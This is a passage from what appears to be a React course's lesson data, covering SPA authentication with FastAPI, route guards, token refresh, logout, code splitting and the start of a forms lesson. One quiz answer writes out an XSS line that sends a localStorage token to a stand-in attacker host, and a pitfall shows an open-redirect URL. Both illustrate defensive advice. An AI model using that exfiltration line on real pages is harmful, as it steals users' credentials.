            element: <RequireRole role="admin" />,
            children: [
              {
                path: "admin",
                lazy: async () => {
                  const { AdminPage } = await import("./routes/admin");
                  return { Component: AdminPage };
                },
              },
            ],
          },
        ],
      },
    ],
  },
]);

// After a deploy, old tabs may request chunks that no longer exist. Vite fires this event
// when a dynamic import's preload fails; reloading fetches the new index.html.
window.addEventListener("vite:preloadError", () => {
  window.location.reload();
});`,
          out: `npm run build → dist/assets/index-[hash].js (shell, login, guards)
                 dist/assets/SettingsPage-[hash].js
                 dist/assets/projects-[hash].js
                 dist/assets/admin-[hash].js   (never downloaded by non-admins who don't visit /admin)`,
          note: `<p><code>React.lazy</code> works anywhere but only splits the component; its data still starts loading after the chunk arrives and renders (a waterfall). Route <code>lazy</code> lets the router download the route module and then run its loader as part of the navigation, while the current page stays visible (no fallback flash, because navigations are transitions). Since the guard (<code>RequireRole</code>) is in the main bundle and the admin code is lazy, non-admins never even download the admin UI, though that's a size win, <b>not</b> a security boundary: chunks are public files. Some newer 7.x releases also accept an object form of <code>lazy</code> that loads each property separately; check your version's docs.</p>`
        },
        {
          t: "Loading states, cross-tab logout and the logout button",
          lang: "tsx",
          code: `// src/auth/LogoutButton.tsx
import { useEffect } from "react";
import { useNavigate } from "react-router";
import { useAuth } from "./AuthProvider";
import { endSession } from "./session";

const channel = new BroadcastChannel("auth");

// Mount once (e.g. in RootLayout): when another tab logs out, this tab forgets the user too.
export function useCrossTabLogout() {
  useEffect(() => {
    const onMessage = (event: MessageEvent<string>) => {
      if (event.data === "logout") endSession(null);
    };
    channel.addEventListener("message", onMessage);
    return () => channel.removeEventListener("message", onMessage);
  }, []);
}

export function LogoutButton() {
  const auth = useAuth();
  const navigate = useNavigate();

  async function handleLogout() {
    await auth.logout();              // server revokes refresh token + clears cookies; cache cleared
    channel.postMessage("logout");    // other tabs of this origin
    navigate("/login", { replace: true });
  }

  if (auth.status !== "authenticated") return null;
  return (
    <button type="button" onClick={() => void handleLogout()}>
      Sign out {auth.user.name}
    </button>
  );
}`,
          note: `<p>After logout three things must be true: the server no longer accepts the old refresh token (Redis entry deleted), the cookies are gone, and no user data remains in memory (TanStack Query cache, Zustand/Redux stores, form drafts). If your app keeps state in many places, the bluntest reliable option is a full reload after logout: <code>window.location.assign("/login")</code> throws away all JS memory. <code>BroadcastChannel</code> only reaches same-origin tabs in the same browser profile; other devices are handled by the server (their refresh tokens are revoked or expire).</p>`
        }
      ],
      internals: `<p><b>What the browser does with cookies.</b> On every request the browser checks each stored cookie's domain, <code>path</code>, <code>Secure</code> flag, expiry and <code>SameSite</code> rule against the request URL and the "site" of the page that initiated it, and attaches the ones that match in a <code>Cookie</code> header. <code>HttpOnly</code> only removes the cookie from <code>document.cookie</code> and other script APIs; it is still sent. That's why an httpOnly cookie protects against <i>theft</i> but not against an XSS script calling <code>fetch("/api/projects/1", { method: "DELETE" })</code> while the page is open: XSS is game over either way, the difference is whether the attacker walks away with a reusable credential. <code>fetch</code>'s <code>credentials</code> option decides whether cookies are sent: <code>"same-origin"</code> (default) or <code>"include"</code> for cross-origin APIs (which also requires the server to answer CORS with <code>Access-Control-Allow-Credentials: true</code> and a specific origin).</p>
<p><b>Why the guard flashes, in React terms.</b> The first render happens synchronously after <code>createRoot().render()</code>; <code>/api/me</code> can't have resolved yet. Whatever <code>RequireAuth</code> returns in that first render is what the user sees. If it returns <code>&lt;Outlet /&gt;</code>, the protected page mounts, its own queries fire (and get 401s), then the redirect happens. If it returns <code>&lt;Navigate&gt;</code>, the router performs a navigation to <code>/login</code> in an effect after commit; when <code>/api/me</code> then succeeds, the login page's own redirect bounces back. With an explicit <code>loading</code> state the first render is a spinner and the decision is made once, with real data. TanStack Query's <code>isPending</code> is true exactly when there is no cached data yet, which is the right signal.</p>
<p><b><code>&lt;Navigate&gt;</code> is an effect.</b> It calls <code>navigate()</code> in <code>useEffect</code> after rendering, because navigating during render would update the router while React is rendering. That's why the render that returned <code>&lt;Navigate&gt;</code> commits (rendering nothing), then the navigation updates router state, then the login page renders. In data mode, <code>redirect()</code> from a loader avoids even that commit: the router never renders the protected route at all.</p>
<p><b>How <code>React.lazy</code> works.</b> <code>lazy(factory)</code> returns a special component type. The first time React renders it, it calls <code>factory()</code>, gets a promise, and <b>throws</b> it (suspends). React unwinds to the nearest <code>&lt;Suspense&gt;</code> boundary and shows its fallback, or, if the update was a transition (router navigations are), keeps showing the previous UI. When the promise resolves, React retries the render, now with the module's <code>default</code> export cached on the lazy object. Vite turns each <code>import()</code> into a separate chunk and injects preload hints for its dependencies; if a chunk 404s (stale deploy), the import rejects, the error propagates to the nearest error boundary, and Vite dispatches <code>vite:preloadError</code>.</p>
<p><b>How route <code>lazy</code> differs.</b> The router calls the route's <code>lazy()</code> during the navigation, before rendering, merges the returned properties (<code>Component</code>, <code>loader</code>, <code>action</code>, <code>ErrorBoundary</code>…) into the route object once, and then runs the loader. Several lazy routes in one navigation load in parallel. No Suspense boundary is involved; the pending state is <code>useNavigation().state === "loading"</code>.</p>
<p><b>Single-flight refresh.</b> JavaScript is single-threaded, so the check-and-assign <code>refreshPromise ??= fetch(...)</code> can't be interleaved: the first 401 handler creates the promise synchronously and every later one finds and awaits it. Clearing it in <code>finally</code> allows a future refresh 15 minutes later.</p>`,
      prod: `<p>A production auth setup for the React → FastAPI → Redis → PostgreSQL stack typically looks like this:</p>
<ul class="pts">
<li><b>Same-site topology.</b> Serve the SPA and the API from the same origin (nginx serves <code>/</code>, proxies <code>/api</code> to FastAPI). Cookies then need no CORS, <code>SameSite=Lax</code> works, and the CSRF story is simple. Splitting into <code>app.example.com</code> and <code>api.example.com</code> is still same-site (cookies with <code>Domain=example.com</code> work, Lax still applies) but needs CORS with credentials. Truly cross-site APIs need <code>SameSite=None; Secure</code> and are increasingly affected by browsers' third-party cookie restrictions; avoid that design.</li>
<li><b>Tokens and storage.</b> Access token: a short-lived JWT in an httpOnly cookie, verified without a database hit. Refresh token: opaque or JWT with a <code>jti</code>, stored in Redis with a TTL (fast revocation, "log out all sessions" = delete the user's keys) or in PostgreSQL if you need an audit trail. Rotate on every refresh and treat reuse as theft. Password change and admin "disable user" revoke all refresh tokens; the short access-token lifetime bounds how long a disabled user keeps access.</li>
<li><b>XSS is the real enemy.</b> httpOnly cookies limit the blast radius, but you still need a strict Content-Security-Policy, no <code>dangerouslySetInnerHTML</code> with user input (or sanitise it), and supply-chain hygiene (lockfiles, audits, few third-party scripts on authenticated pages).</li>
<li><b>Boot performance.</b> <code>/api/me</code> is on the critical path of every page load. Keep it fast (cache the user/permissions in Redis), and consider rendering the public shell immediately while only protected areas wait. In SSR frameworks the server reads the cookie and renders the right state, with no client-side flash at all (Day 13).</li>
<li><b>401 vs 403.</b> 401 means "not authenticated" (refresh or log in); 403 means "authenticated but not allowed" (show a "no access" page, never log the user out). Mixing them causes logout loops. 419/440-style custom codes are non-standard; stick to 401/403.</li>
<li><b>Observability.</b> Log refresh failures and reuse detections server-side (they indicate theft or bugs). On the client, report unexpected logouts to Sentry with the route; a spike after a deploy usually means a cookie <code>path</code>/<code>domain</code> or proxy header changed.</li>
<li><b>Code splitting at scale.</b> Split by route first (every feature lazy), then heavy widgets (charts, editors, maps). Prefetch likely next routes on hover or when idle. Handle stale chunks after deploys (<code>vite:preloadError</code> → reload) and keep old asset files around for a while (upload new assets to the CDN before switching <code>index.html</code>). Day 11 covers bundle analysis.</li>
<li><b>Enterprise SSO.</b> With OIDC (Azure AD/Entra ID, Okta, Keycloak) prefer the <b>backend-for-frontend</b> pattern: FastAPI does the authorization-code flow and sets the same httpOnly session cookies, so the React code above does not change. Pure in-browser OIDC libraries keep tokens in JS and inherit the localStorage trade-offs.</li>
</ul>`,
      iq: [
        ["fresher", "What is the difference between authentication and authorisation?", `<p><b>Authentication</b> establishes identity ("you are user 17", via password, SSO, passkey). <b>Authorisation</b> decides what that identity may do ("user 17 may edit project 42 but not delete it"). In HTTP terms a failed authentication is <b>401 Unauthorized</b> (badly named: it means unauthenticated) and a failed authorisation is <b>403 Forbidden</b>. In a React + FastAPI app both are enforced by FastAPI; React only reflects them in the UI.</p>`],
        ["mid", "Should you store a JWT in localStorage or in an httpOnly cookie? Justify.", `<p>For a same-site SPA, an <b>httpOnly, Secure, SameSite cookie</b>. Anything in <code>localStorage</code> is readable by any script on the page, so a single XSS bug or compromised dependency can exfiltrate the token and use it from anywhere until it expires. An httpOnly cookie can't be read by JS; XSS can still make requests while the page is open, but can't steal the credential. The cost is CSRF, handled with <code>SameSite=Lax</code> plus a CSRF token header for state-changing requests and never mutating on GET. The tempting answer "localStorage is fine because we escape output" assumes you will never have an XSS bug anywhere, including in third-party code; "cookies are insecure because of CSRF" ignores that CSRF is solved by SameSite and tokens.</p>`],
        ["mid", "How do you implement a protected route in React Router, and how do you send the user back after login?", `<p>A pathless layout route <code>RequireAuth</code> wraps the protected children. It reads the auth state: while <i>loading</i> it renders a spinner; when <i>anonymous</i> it returns <code>&lt;Navigate to="/login" replace state={{ from: location }} /&gt;</code>; when <i>authenticated</i> it renders <code>&lt;Outlet /&gt;</code>. The login page reads <code>location.state.from</code> and after success calls <code>navigate(from.pathname + from.search, { replace: true })</code>. <code>replace</code> keeps <code>/login</code> out of history so Back doesn't loop. In data mode the alternative is a loader that <code>throw redirect("/login?redirectTo=...")</code>, which avoids rendering entirely but requires validating <code>redirectTo</code> against open redirects.</p>`],
        ["mid", "Why does a protected page flash before redirecting to login, and how do you fix it?", `<p>Because the auth check is asynchronous (<code>/api/me</code>, or reading a token in an effect) and the guard renders something before it completes. If it treats "unknown" as "authenticated" the page flashes; if it treats "unknown" as "anonymous" logged-in users are bounced to <code>/login</code> and back. Fix: model three states (<code>loading</code>, <code>anonymous</code>, <code>authenticated</code>), render a neutral loading UI while loading, and only then decide. In data mode, a loader guard decides before rendering at all.</p>`],
        ["senior", "Explain access and refresh tokens, rotation, and how the SPA should handle an expired access token.", `<p>The access token is short-lived and sent on every request, so stealing it has limited value and the API can verify it cheaply. The refresh token is long-lived, sent only to the refresh endpoint, and stored server-side so it can be revoked. <b>Rotation</b>: each refresh returns a new refresh token and invalidates the old one; presenting an already-used token signals theft, so the server revokes the whole session. In the SPA, one fetch wrapper catches 401, triggers <b>a single shared refresh</b> (concurrent 401s await the same promise, otherwise parallel refreshes trip reuse detection and log the user out), retries the original request once, and if refresh fails sets the session to anonymous and lets guards redirect. Don't refresh on 401s from the login endpoint, and never on 403.</p>`],
        ["senior", "We hide the Delete button for non-admins. Is that enough? What else do you need?", `<p>No. Hiding UI is a usability feature; the browser is fully controlled by the user, who can call the API directly. FastAPI must enforce authorisation on every endpoint (a <code>require_role</code>/permission dependency, plus row-level checks like ownership in the query) and return 403. The frontend should get permissions from the backend (<code>/api/me</code>) rather than re-deriving them, and must handle 403 gracefully (the UI can be stale if roles change mid-session). Code-split admin chunks are also public files, so lazy loading isn't access control either.</p>`],
        ["senior", "If we use cookies, how do we protect against CSRF? Is <code>SameSite=Lax</code> enough?", `<p><code>SameSite=Lax</code> blocks cookies on cross-site POSTs and subresource requests, which stops the classic hidden-form CSRF, and with modern browsers it is a strong baseline. It is not complete: SameSite is about <b>sites</b> (registrable domains), so any subdomain (including one hosting user content or a compromised marketing site) counts as same-site; GET endpoints that change state are still exposed to top-level navigations; and older browsers differ. Defence in depth: never mutate on GET, require a CSRF token header on unsafe methods (double-submit cookie or a server-stored token), optionally check <code>Origin</code>, and accept only <code>application/json</code> bodies so cross-site forms can't produce valid requests without a CORS preflight.</p>`],
        ["lead", "After logout on a shared computer, the next user briefly sees the previous user's projects. What went wrong and how do you design logout?", `<p>The client cleared the "user" but not the data: TanStack Query (or a store) still held cached queries keyed without the user id, and the next login rendered them from cache before refetching. Design logout as a session reset: call <code>/api/auth/logout</code> (server revokes the refresh token, clears cookies), then remove all cached queries and reset every client store, and broadcast to other tabs. Do the same reset on <i>login</i> in case a previous session wasn't cleanly ended. If state lives in many places, a hard navigation (<code>window.location.assign("/login")</code>) is the simplest guarantee. Also make sure API responses with user data are sent with <code>Cache-Control: private, no-store</code> so the HTTP cache doesn't serve them.</p>`],
        ["architect", "Design authentication for a React SPA + FastAPI platform that must also support enterprise SSO and a mobile app.", `<p>Use a <b>backend-for-frontend</b> for the web: FastAPI (or a small auth service) runs the OIDC authorization-code flow with the identity provider, then issues its own session as httpOnly cookies (short access token, rotated refresh token in Redis). The SPA never touches IdP tokens; its code is identical for password and SSO logins. The mobile app uses the same identity provider with authorization code + PKCE and gets bearer tokens stored in the OS keychain (no cookies, no CSRF). The API accepts both: cookie sessions (with CSRF checks) for the web, bearer tokens for mobile, normalised into one <code>current_user</code> dependency. Authorisation is centralised in the API (roles → permissions, row-level checks), exposed to clients via <code>/api/me</code> for UI only. Revocation via Redis, audit logs in PostgreSQL, rate limiting on login and refresh. The trade-off versus putting OIDC in the browser: one more hop at login and a stateful backend, in exchange for keeping all tokens out of JavaScript.</p>`]
      ],
      gotchas: [
        `<b>Raising <code>HTTPException</code> in FastAPI drops cookies set on the injected <code>Response</code>.</b> If an endpoint needs to clear cookies <i>and</i> return an error, return a <code>JSONResponse</code> and call <code>delete_cookie</code> on it. Also, <code>delete_cookie</code> must use the same <code>path</code> (and <code>domain</code>) the cookie was set with, or the browser keeps the old one.`,
        `<b>Parallel refreshes with rotation log users out.</b> Five queries fail with 401 at the same time, each calls <code>/api/auth/refresh</code> with the same refresh token; the first succeeds and rotates it, the other four look like token reuse. Always share one in-flight refresh promise.`,
        `<b><code>location.state</code> is lost on refresh of a new tab or when the URL is shared</b>, and it is typed <code>any</code>-ish; cast it to a narrow type and fall back to <code>"/"</code>. A <code>?redirectTo=</code> param survives everything but must be validated, or <code>/login?redirectTo=https://evil.example</code> becomes a phishing tool.`,
        `<b>Treating every 401 as "log out" breaks the login page:</b> a wrong password returns 401 too. Exclude <code>/api/auth/*</code> from refresh and global handling, and make <code>/api/me</code> return <code>null</code> for 401 instead of throwing.`,
        `<b>Treating 403 as 401</b> (logging the user out when they open a page they can't access) creates logout loops and angry users. 403 = show "no access", keep the session.`,
        `<b><code>React.lazy</code> needs a default export.</b> For named exports: <code>lazy(() =&gt; import("./x").then((m) =&gt; ({ default: m.Admin })))</code>. And never call <code>lazy()</code> inside a component: a new lazy type each render remounts and refetches the chunk forever.`,
        `<b>A Suspense boundary too high up</b> (around the whole app) replaces the entire layout with a spinner whenever any lazy component loads outside a transition. Put boundaries around the outlet or the lazy widget, and rely on router navigations being transitions to keep the old page visible.`,
        `<b>Stale chunks after a deploy</b>: an open tab still runs the old <code>index</code> bundle that references <code>admin-OLDHASH.js</code>, which the new deploy deleted. Navigating to <code>/admin</code> then fails. Keep old assets for a while and reload on <code>vite:preloadError</code>.`,
        `<b>Auth state in two places drifts.</b> A token in <code>localStorage</code> plus a user in context plus a user in Redux will disagree after a refresh failure. Keep one source of truth (the <code>["me"]</code> query) and derive everything from it.`
      ],
      best: [
        `Keep credentials out of JavaScript: httpOnly, Secure, SameSite cookies set by FastAPI; short-lived access tokens; rotated, revocable refresh tokens in Redis.`,
        `Model auth as an explicit state machine (<code>loading | anonymous | authenticated</code>) derived from <code>/api/me</code>; never render protected content or redirect while <code>loading</code>.`,
        `Guard routes in one place (a <code>RequireAuth</code> layout route or loader guards), use <code>replace</code> for auth redirects, preserve the intended destination, and validate any redirect target as same-origin.`,
        `Handle 401 in exactly one fetch wrapper with a single-flight refresh, and end the session globally via <code>QueryCache</code>/<code>MutationCache</code> <code>onError</code>; treat 403 separately.`,
        `Enforce every permission in FastAPI dependencies; let the frontend consume backend-computed permissions purely for UI.`,
        `Make logout (and login) reset all client caches and stores, notify other tabs, and send user data with <code>Cache-Control: private, no-store</code>.`,
        `Lazy-load every feature route (route <code>lazy</code> in data mode), keep the login page and shell small, place Suspense boundaries close to what suspends, and recover from stale chunks.`
      ],
      lab: [
        `Add <code>@tanstack/react-query</code> and create <code>src/auth/api.ts</code>, <code>session.ts</code> and <code>AuthProvider.tsx</code> from the examples. If you don't have the FastAPI backend handy, implement <code>/api/me</code>, <code>/api/auth/login</code>, <code>/api/auth/logout</code> and <code>/api/auth/refresh</code> with MSW or a tiny FastAPI app, and proxy <code>/api</code> in <code>vite.config.ts</code> (<code>server: { proxy: { "/api": "http://localhost:8000" } }</code>).`,
        `Wrap <code>RouterProvider</code> in <code>QueryClientProvider</code> and <code>AuthProvider</code>. Add <code>/login</code>, and put <code>/projects</code> and <code>/settings</code> under a pathless <code>RequireAuth</code> layout route. Add <code>/admin</code> under <code>RequireRole role="admin"</code>.`,
        `Throttle the network to "Slow 3G" in DevTools, reload <code>/projects?status=active</code> while logged out, and confirm you see a spinner, then the login page, and after logging in you land back on <code>/projects?status=active</code>; press Back and confirm you don't return to <code>/login</code>.`,
        `Make the access token expire (or have the mock return 401 once) while three queries are active; confirm in the Network tab that exactly <b>one</b> <code>/api/auth/refresh</code> request is made and the queries succeed on retry. Then make refresh fail and confirm you are sent to login.`,
        `Turn <code>SettingsPage</code> into <code>React.lazy</code> and the projects and admin routes into route <code>lazy</code>. Run <code>npm run build</code> and check that separate chunks appear in <code>dist/assets</code>; in the Network tab confirm the admin chunk is only requested when you visit <code>/admin</code>.`,
        `<b>Done when:</b> no protected page ever flashes for a logged-out user (even on Slow 3G), the redirect returns to the exact URL, concurrent 401s produce one refresh, logging out and in as a different user shows none of the first user's data, a non-admin sees no admin link and gets 403 from the API when calling it directly, and the admin code is in its own chunk.`
      ],
      teach: `<p>"Authentication is the server's job; the React app's job is to hold the session safely and reflect it. I keep tokens out of JavaScript: FastAPI sets httpOnly, Secure, SameSite cookies, a 15-minute access token and a rotated refresh token tracked in Redis. A token in localStorage can be stolen by any XSS; an httpOnly cookie can't. Cookies bring CSRF, so I use SameSite=Lax plus a CSRF header on writes.</p>
<p>On the client, the current user is a TanStack Query on <code>/api/me</code>, exposed through an AuthProvider with three states: loading, anonymous, authenticated. A RequireAuth layout route shows a spinner while loading, redirects anonymous users to /login with the original location in state, and otherwise renders the Outlet. That's what prevents the flash, and the login page sends you back where you were with replace.</p>
<p>All requests go through one fetch wrapper: on a 401 it does a single shared refresh and retries; if refresh fails, a global QueryCache handler sets the user to null and clears cached data, and the guards redirect. Logout does the same reset after the server revokes the session. Roles hide buttons, but FastAPI enforces them with dependencies, because the browser can't be trusted. Finally, I lazy-load each route, so anonymous users download only the login page and non-admins never download the admin panel."</p>`
    }
  ],
  quiz: [
    {
      q: `The app works perfectly with <code>npm run dev</code>. After deploying the Vite build to nginx, clicking around works, but refreshing <code>https://app.example.com/projects/42</code> shows nginx's "404 Not Found" page. The config is below. What's wrong?`,
      code: `server {
  listen 80;
  root /usr/share/nginx/html;
  location /api/ { proxy_pass http://api:8000; }
  location / {
    try_files $uri $uri/ =404;
  }
}`,
      lang: "text",
      ans: `nginx has no SPA fallback: change the last line to <code>try_files $uri $uri/ /index.html;</code>.`,
      why: `Client-side navigations never ask the server for <code>/projects/42</code>; a refresh or a shared link does. nginx looks for a file at that path, finds none, and returns 404 before React ever loads. Falling back to <code>index.html</code> lets the app boot and React Router match the URL. Keep the <code>/api/</code> location separate (as here) so API 404s stay JSON, and serve <code>index.html</code> with <code>Cache-Control: no-cache</code>. The dev server hid the bug because Vite falls back to <code>index.html</code> automatically.`
    },
    {
      q: `Logged-in users report that every time they open a bookmarked <code>/projects</code> page, they briefly see the login page and are then bounced back to <code>/projects</code>. Find the bug.`,
      code: `export function RequireAuth() {
  const { data: user } = useQuery({ queryKey: ["me"], queryFn: fetchMe });
  const location = useLocation();
  if (!user) return <Navigate to="/login" replace state={{ from: location }} />;
  return <Outlet />;
}`,
      lang: "tsx",
      ans: `It treats "not loaded yet" (<code>user === undefined</code>) as "logged out". Check <code>isPending</code> first and render a spinner.`,
      why: `On the first render the <code>/api/me</code> query hasn't resolved, so <code>data</code> is <code>undefined</code> and the guard redirects to <code>/login</code>. When the query resolves, the login page sees an authenticated user and redirects back: the flash. The fix is a three-state check: <code>if (isPending) return &lt;Spinner /&gt;; if (!user) return &lt;Navigate ... /&gt;; return &lt;Outlet /&gt;</code>, with <code>fetchMe</code> returning <code>null</code> on 401 so "anonymous" is a distinct, loaded state. The opposite bug (rendering the Outlet while loading) shows protected content to anonymous users for a moment and fires API calls that 401.`
    },
    {
      q: `A team stores the JWT returned by <code>/api/auth/login</code> in <code>localStorage</code> and sends it as a Bearer header. A security review finds an XSS bug in a markdown preview that uses <code>dangerouslySetInnerHTML</code>. The team says: "we'll fix the XSS; storage doesn't matter". Are they right? What would you change?`,
      code: `localStorage.setItem("token", data.access_token);
// ...
fetch("/api/projects", { headers: { Authorization: \`Bearer \${localStorage.getItem("token")}\` } });`,
      lang: "ts",
      ans: `Fix the XSS, and also move the token into an httpOnly, Secure, SameSite cookie set by FastAPI (with a CSRF header for writes).`,
      why: `With the token in <code>localStorage</code>, the injected script can run <code>fetch("https://evil.example/?t=" + localStorage.token)</code> and the attacker can use the token from anywhere until it expires, long after the tab closes. An httpOnly cookie can't be read by JavaScript, so XSS can only act while the victim's page is open; the credential itself can't be exfiltrated. XSS is still serious either way (fix it, sanitise markdown, add a CSP), but storage decides the blast radius of the next XSS bug, and there will be one somewhere, including in dependencies. Moving to cookies means adding CSRF protection: <code>SameSite=Lax</code> plus a double-submit token.`
    },
    {
      q: `On the projects list, the user filters by <code>status=active</code> and searches for "billing". When they click "Next page", the filter and search disappear and they see page 2 of <i>all</i> projects. Why?`,
      code: `const [searchParams, setSearchParams] = useSearchParams();
const page = Number(searchParams.get("page") ?? "1");
// ...
<button onClick={() => setSearchParams({ page: String(page + 1) })}>Next</button>`,
      lang: "tsx",
      ans: `<code>setSearchParams</code> with an object <b>replaces</b> the whole query string. Merge with the previous params instead.`,
      why: `Unlike <code>setState</code> on an object you'd spread yourself, there's no implicit merge: <code>?q=billing&amp;status=active&amp;page=1</code> becomes <code>?page=2</code>. Use the functional form: <code>setSearchParams((prev) =&gt; { const next = new URLSearchParams(prev); next.set("page", String(page + 1)); return next; })</code>. Conversely, when a filter changes you usually want to <i>delete</i> <code>page</code> so the user starts at page 1. Also note that several <code>setSearchParams</code> calls in one event don't queue the way React state updates do; compute all changes in one call.`
    },
    {
      q: `Users with many dashboard widgets get randomly logged out roughly every 15 minutes, even though their refresh token is valid for 14 days. The server rotates refresh tokens and revokes the session if an old one is reused. The client's fetch wrapper is below. What's happening?`,
      code: `async function apiFetch(path: string, init: RequestInit = {}) {
  let res = await fetch(path, init);
  if (res.status === 401) {
    const refreshed = await fetch("/api/auth/refresh", { method: "POST" });
    if (refreshed.ok) res = await fetch(path, init);
  }
  return res;
}`,
      lang: "ts",
      ans: `Concurrent 401s each start their own refresh with the same refresh token; the server sees reuse and revokes the session. Share a single in-flight refresh promise.`,
      why: `When the access token expires, all widgets' queries get 401 at about the same moment. The first refresh succeeds and rotates the token; the next ones present the now-used token, which the server's reuse detection correctly interprets as theft, revoking the whole token family. Fix: a module-level <code>refreshPromise</code> that all callers await (<code>refreshPromise ??= fetch(...).finally(() =&gt; { refreshPromise = null; })</code>), retry each request once, and skip refresh for <code>/api/auth/*</code>. Some teams add a short server-side grace window for the previous token, but the client fix comes first.`
    },
    {
      q: `Alice logs out on a shared office PC; Bob logs in on the same tab. For about a second Bob's dashboard shows Alice's "Recent projects" before it changes to his. Logout is implemented as below. What's missing?`,
      code: `async function logout() {
  await apiFetch("/api/auth/logout", { method: "POST" });
  queryClient.setQueryData(["me"], null);
  navigate("/login", { replace: true });
}`,
      lang: "ts",
      ans: `Logout only clears the user, not the cached data. Remove all other queries (and reset other stores) on logout and on login.`,
      why: `TanStack Query still holds <code>["projects", "recent"]</code> from Alice's session. When Bob's dashboard mounts, the query shows the cached (stale) data immediately while it refetches in the background: that's the normal stale-while-revalidate behaviour, applied to the wrong user. Logout must reset the session: <code>queryClient.removeQueries({ predicate: (q) =&gt; q.queryKey[0] !== "me" })</code> (or <code>queryClient.clear()</code> followed by a full reload), reset Zustand/Redux stores, and broadcast to other tabs. Doing the same reset on login also covers sessions that ended without a clean logout (expiry, server revocation).`
    }
  ]
},
/* ===== Day 9 ===== */
{
  n: 9,
  title: "Forms, styling and accessibility",
  goal: `<b>By the end of today</b> you can build large, fast, type-safe forms with React Hook Form and Zod, show FastAPI's 422 validation errors next to the right fields, and decide when React 19's form actions (<code>useActionState</code>, <code>useFormStatus</code>, <code>useOptimistic</code>) are the better tool. You can also choose a styling approach for a team (CSS Modules, Tailwind, zero-runtime CSS-in-JS) and build components that keyboard and screen-reader users can actually operate: labelled fields, real buttons, modals that trap and return focus, and focus that moves sensibly on route changes.`,
  rev: [
    `<b>Controlled-everything forms</b> put every field in React state, so each keystroke re-renders the whole form. <b>React Hook Form</b> keeps values in the DOM and a ref-based store: <code>register</code> wires native inputs, <code>Controller</code> wraps custom inputs that only expose <code>value</code>/<code>onChange</code>, <code>useFieldArray</code> manages dynamic rows (key them by <code>field.id</code>, never the index), and <code>formState</code> is a proxy that only re-renders for the properties you read.`,
    `<b>Zod</b> gives you one schema for runtime validation and the TypeScript type (<code>z.infer</code>); plug it in with <code>zodResolver</code> from <code>@hookform/resolvers/zod</code>. The <b>server is the authority</b>: FastAPI/Pydantic re-validates and returns <code>422 {"detail":[{"loc":["body","email"],"msg":…}]}</code>. Drop the leading <code>"body"</code>, join the rest with dots, and call <code>setError(path, { type: "server", message })</code>; anything you can't map goes to <code>root.server</code>.`,
    `<b>React 19 form actions:</b> <code>&lt;form action={fn}&gt;</code> calls <code>fn(formData)</code> inside a transition and resets uncontrolled fields afterwards. <code>useActionState(action, initial)</code> (from <code>react</code>) returns <code>[state, formAction, isPending]</code>; the action receives <code>(prevState, formData)</code>. <code>useFormStatus()</code> (from <code>react-dom</code>) only works in a component rendered <i>inside</i> the form. <code>useOptimistic</code> shows a temporary value while an action is running. Use RHF for rich client-side forms; actions for simple forms and Server Functions.`,
    `<b>Styling:</b> CSS Modules (scoped class names, zero runtime) and Tailwind (utility classes, zero runtime) are the safe defaults; runtime CSS-in-JS (styled-components, Emotion) costs JS at render time and needs client components in a Server Components app; zero-runtime alternatives (vanilla-extract, Linaria, Panda, StyleX) extract CSS at build time. Put design tokens in CSS custom properties and combine classes with <code>clsx</code>.`,
    `<b>Accessibility:</b> use real elements (<code>&lt;button&gt;</code>, <code>&lt;a href&gt;</code>, <code>&lt;label htmlFor&gt;</code>) before ARIA; generate ids with <code>useId</code>; link errors with <code>aria-describedby</code> and <code>aria-invalid</code>. Modals need a label, a focus trap, Escape to close and focus returned to the opener (native <code>&lt;dialog&gt;</code> + <code>showModal()</code> does most of it; otherwise <code>createPortal</code> + <code>inert</code>). Move focus to the new page heading on route change. Lint with <code>eslint-plugin-jsx-a11y</code>, test with axe, and try a real screen reader. Radix and React Aria give you accessible headless primitives.`
  ],
  topics: [
    /* ------------------------------------------------------------------ */
    {
      id: "d9-forms",
      title: "Forms at scale: React Hook Form, Zod and React 19 actions",
      lv: ["fresher", "mid", "senior", "lead"],
      eli5: `<p>Imagine filling in a long paper form at a bank. One clerk stands behind you and, <i>every time you write a single letter</i>, takes the whole form, re-reads every box from top to bottom and hands it back. That is a form where every field is controlled React state: correct, but exhausting once the form has fifty boxes.</p>
<p>A better clerk lets you write freely and only looks at a box when you leave it or when you hand the form in. That is <b>React Hook Form</b>: the paper (the browser's input elements) holds what you wrote, and the clerk checks it at the moments that matter.</p>
<p>The clerk checks against a <b>rule book</b>: "email must contain an @", "age must be 18 or more". Write the rule book once and both you and the clerk use it. That is a <b>Zod schema</b>, and TypeScript reads the same book to know the shape of the form.</p>
<p>But the clerk at the counter is not the final word. The form goes to the <b>back office</b> (FastAPI), which checks everything again, because anyone could have walked in with a forged form. If the back office finds a problem, it sends the form back with a note: "box <i>email</i>: already registered". A good front desk puts that note <i>next to the email box</i>, not on a sticky note at the top that says "something went wrong".</p>`,
      what: `<p>A <b>form</b> in a React app is three problems at once: holding the values while the user types, <b>validating</b> them (on the client for speed, on the server for truth), and <b>submitting</b> them while showing pending, success and error states. Day 3 covered the basics: controlled inputs (<code>value</code> + <code>onChange</code>) and uncontrolled inputs (<code>defaultValue</code>, read with a ref or <code>FormData</code>). Today is about doing this at scale: 30-field settings pages, invoices with dynamic line items, wizards, and forms whose errors come back from a FastAPI backend.</p>

<h5>Why "controlled everything" gets slow and complex</h5>
<p>The textbook controlled form keeps every value in <code>useState</code> (or one object in state). It works, and for a login form it is fine. As forms grow, it hurts in four ways:</p>
<ul class="pts">
<li><b>Re-render cost.</b> Every keystroke calls <code>setState</code> on the component that owns the form, so React re-renders that component <i>and every field component below it</i>. With 50 fields, a rich-text editor, a date picker and inline validation, typing starts to lag (you will see it as poor INP on Day 11). <code>React.memo</code> on each field helps only if every prop (including <code>onChange</code>) is stable.</li>
<li><b>Boilerplate per field.</b> Each field needs a value, an <code>onChange</code>, a "touched" flag, an error, maybe a "dirty" flag. Multiply by fields and you have a hand-written form library with bugs.</li>
<li><b>Validation timing.</b> "Show the error after the user leaves the field, then re-validate on every change, and validate everything on submit" is surprisingly fiddly to get right by hand.</li>
<li><b>Dynamic structures.</b> Adding, removing and reordering rows (invoice lines, phone numbers) with stable identity and per-row errors is where hand-rolled forms usually break.</li>
</ul>

<h5>React Hook Form: the mental model</h5>
<p><b>React Hook Form (RHF)</b> flips the default: inputs are <b>uncontrolled</b>. The DOM holds the current value; RHF keeps a reference to each input (via the <code>ref</code> that <code>register</code> returns) and a ref-based store of values and errors that lives <i>outside</i> React state. Typing does not re-render your component unless something you subscribed to changes (for example an error appears for that field).</p>
<ul class="pts">
